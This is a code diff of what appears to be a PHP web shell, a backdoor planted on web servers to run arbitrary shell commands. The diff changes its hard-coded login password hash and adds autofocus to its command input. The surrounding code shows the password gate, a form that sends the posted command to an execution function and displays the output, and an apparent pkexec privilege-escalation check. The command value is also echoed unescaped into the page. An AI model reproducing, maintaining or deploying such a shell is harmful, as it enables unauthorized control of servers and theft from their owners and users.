@@ -458,7 +458,7 @@ function cekPkexec() {
 }
 
 //login
-$passwd = '5c3c0d4ceddf2d80aad8df2c5e28e976c19e286a';
+$passwd = 'a2ca3756e57aa590065a201b72e02a55341553bd';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
@@ -1929,7 +1929,7 @@ $path = str_replace("\\", "/", $path);
         <form class="md:w-10/12 w-full mt-4 mx-2 mb-12 pb-12" style="height: 70vh;" action="" method="POST">
             <div class="flex">
                 <span class="inline-flex text-white fs-xl">$</span>
-                <input type="text" id="komendnya" name="komendnya" class="komendnya ubuntu-mono mb-1 w-full h-10 bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none" value="'.$_POST['komendnya'].'">
+                <input type="text" id="komendnya" name="komendnya" class="komendnya ubuntu-mono mb-1 w-full h-10 bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none" autofocus value="'.$_POST['komendnya'].'">
             </div>
             <textarea name="nulzcmd" id="nulzcmd" readonly class="nulzcmd ubuntu-mono px-4 py-2 mt-1 w-full h-full bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none '.$txtEmerald.'">'.NuLzCmd(trim(htmlspecialchars(stripslashes($_POST['komendnya'])))).'</textarea>
         </form>
